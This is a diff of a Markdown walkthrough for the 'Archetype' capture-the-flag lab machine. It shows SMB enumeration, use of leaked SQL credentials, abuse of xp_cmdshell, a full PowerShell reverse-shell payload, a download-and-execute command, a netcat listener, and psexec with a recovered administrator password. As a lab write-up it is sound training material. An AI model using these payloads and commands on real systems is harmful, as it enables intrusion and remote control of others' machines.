@@ -2,7 +2,8 @@
 
 ###### // We will start with nmap scan on all ports
 
-$ nmap -sV -A -Pn 10.10.10.27 -p-
+	$ nmap -sV -A -Pn 10.10.10.27 -p-
+-----
 
 	Nmap scan report for 10.10.10.27
 	Host is up (0.26s latency).
@@ -67,9 +68,12 @@ $ nmap -sV -A -Pn 10.10.10.27 -p-
 	|_  start_date: N/A
 
 
+
 // We can see there is smb service open (usually ports 139 and 445), When there is a smb service open usually the anonymous connection allowed by default, we can check that with 'smbclient' command
 
-$ smbclient -N -L \\\\10.10.10.27\\
+
+	$ smbclient -N -L \\\\10.10.10.27\\
+-----
 
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -79,9 +83,12 @@ $ smbclient -N -L \\\\10.10.10.27\\
 	IPC$            IPC       Remote IPC
 	SMB1 disabled -- no workgroup available
 
+
 // we can see shared directory called backups, inside backups directory there is a file called prod.dtsConfig 
 
-$ smbclient -N \\\\10.10.10.27\\backups
+
+	$ smbclient -N \\\\10.10.10.27\\backups
+-----
 
 	Try "help" to get a list of possible commands.
 	smb: \> dir
@@ -93,14 +100,19 @@ $ smbclient -N \\\\10.10.10.27\\backups
 	smb: \> get prod.dtsConfig
 	getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
 
+
 // lets grab him
+
 
 	smb: \> get prod.dtsConfig
 	getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
 
+
 // and see the content
 
-$ cat prod.dtsConfig 
+
+	$ cat prod.dtsConfig 
+-----
 
 	<DTSConfiguration>
 	    <DTSConfigurationHeading>
@@ -111,11 +123,15 @@ $ cat prod.dtsConfig
 	    </Configuration>
 	</DTSConfiguration>
 
+
 // Its seems we have some credentials
+
 
 	Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1
 
+
 // Since we know from nmap there is ms-sql service running
+
 
 	| ms-sql-info: 
 	|   10.10.10.27:1433: 
@@ -127,7 +143,9 @@ $ cat prod.dtsConfig
 	|       Post-SP patches applied: false
 	|_    TCP port: 1433
 
+
 // Its probably the ms-sql user credentials, lets try connect with Impacket's tool called 'mssqlclient.py' with '-windows-auth' flag, since we know the host is windows from nmap (OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)), and we have credentials
+
 
 	$ cp /usr/share/doc/python3-impacket/examples/mssqlclient.py mssqlclient.py
 
@@ -148,7 +166,9 @@ $ cat prod.dtsConfig
 	[!] Press help for extra shell commands
 	SQL> 
 
+
 // lets dig inside the DataBase, First we will check if our current ms-sql user member in 'sysadmin' role (1 means True)
+
 
 	SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
 
@@ -157,16 +177,22 @@ $ cat prod.dtsConfig
 
 		  1 
           
+
 // Now we will want to enable to display all the avalible options configured at instance level in SQL. the command will allow any user to have access to sp_configure command and will expose advanced configurtatiom parameters to an untrusted user.
+
 
 	SQL> EXEC sp_configure 'Show Advanced Options', 1;
 	[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
 
+
 // sql need refresh to configuration by command 'reconfigure;'
+
 
 	SQL> reconfigure;
 
+
 // now we will see the options of 'sp_configure'
+
 
 	SQL> sp_configure;
 	name                                      minimum       maximum   config_value     run_value   
@@ -184,7 +210,9 @@ $ cat prod.dtsConfig
 	xp_cmdshell                                     0             1              1             1 
 
 
+
 // we can see in the end that we can use 'xp_cmdshell' lets try this
+
 
 	SQL> xp_cmdshell "whoami"
 	output                                                                             
@@ -195,27 +223,38 @@ $ cat prod.dtsConfig
 
 	NULL   
 
-// Awesome! we can intercat with Host, now We will use powershell to download powershell(.ps1) payload, First we will make the payload file, i have found great reverse powershell script in https://www.revshells.com/
 
-$ cat shell.ps1 
+// Awesome! we can intercat with Host, now We will use powershell to download powershell(.ps1) payload, First we will make the payload file, great site for generate reverse powershell script ![here](https://www.revshells.com/)
+
+
+	$ cat shell.ps1 
+-----
 
 	$client = New-Object System.Net.Sockets.TCPClient("10.10.16.7",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
+
 // Now will we open http server using python for upload the file
+
 
 	$ sudo python3 -m http.server 1444
 	Serving HTTP on 0.0.0.0 port 1444 (http://0.0.0.0:1444/) ...
 
+
 // And open a listiner on port 443
+
 
 	$ sudo rlwrap nc -lvnp 443
 	listening on [any] 443 ...
 
+
 // Now when all set we can transfer the shell.ps1 payload to targeted machine and execute
+
 
 	SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.7:1444/shell.ps1\");"
 
+
 // We have a shell !!!
+
 
 	$ sudo rlwrap nc -lvnp 443
 	[sudo] password for kali: 
@@ -225,14 +264,19 @@ $ cat shell.ps1
 	# whoami
 	archetype\sql_svc
 
+
 // we have the user flag !
+
 
 	# type user.txt
 	3e7b1..............
 
+
 ## ------------------------------Privileges Escalation---------------------------------------
 
-Digging in our user(sql_svc), didnt find much, try 'dir /a' (show hidden) didnt work, entering powershell by writhing 'powershell' command
+
+// Digging in our user(sql_svc), didnt find much, try 'dir /a' (show hidden) didnt work, entering powershell by writhing 'powershell' command
+
 
 	# powershell
 	Windows PowerShell 
@@ -240,10 +284,12 @@ Digging in our user(sql_svc), didnt find much, try 'dir /a' (show hidden) didnt 
 
 	PS C:\Users\sql_svc> 
 
+
 // using 'dir -Force'(powershell command) to show all hidden
 
-	# dir -Force
 
+	# dir -Force
+-----
 
     Directory: C:\Users\sql_svc
 
@@ -283,7 +329,9 @@ Digging in our user(sql_svc), didnt find much, try 'dir /a' (show hidden) didnt 
 	---hs-        1/19/2020   3:10 PM             20 ntuser.ini                                                            
 
 
+
 // continued digging we found file called 'ConsoleHost_history.txt' in '\Users\sql_svc\AppData\Roaming\Microsoft\windows\PowerShell\PSReadline'
+
 
 	# pwd
 
@@ -296,9 +344,12 @@ Digging in our user(sql_svc), didnt find much, try 'dir /a' (show hidden) didnt 
 	net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 
 
+
 // the file contains administrator credentials !!!, for admin shell we can use another Impacket's tool called 'psexec.py', that is a telnet-replacement that lets you execute processes on remote system connection conditions are that shell will spawn for specified user only if 'ADMIN$' and 'C$' shares are writable.
 
-$ cp /usr/share/doc/python3-impacket/examples/psexec.py psexec.py
+
+	$ cp /usr/share/doc/python3-impacket/examples/psexec.py psexec.py
+-----
 
 	$ python3 psexec.py administrator@10.10.10.27
 	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -317,7 +368,9 @@ $ cp /usr/share/doc/python3-impacket/examples/psexec.py psexec.py
 	C:\Windows\system32>whoami
 	nt authority\system
 
+
 // we have Administrator flag !
+
 
 	C:\Users\Administrator\Desktop>type root.txt
 	b91cce.................
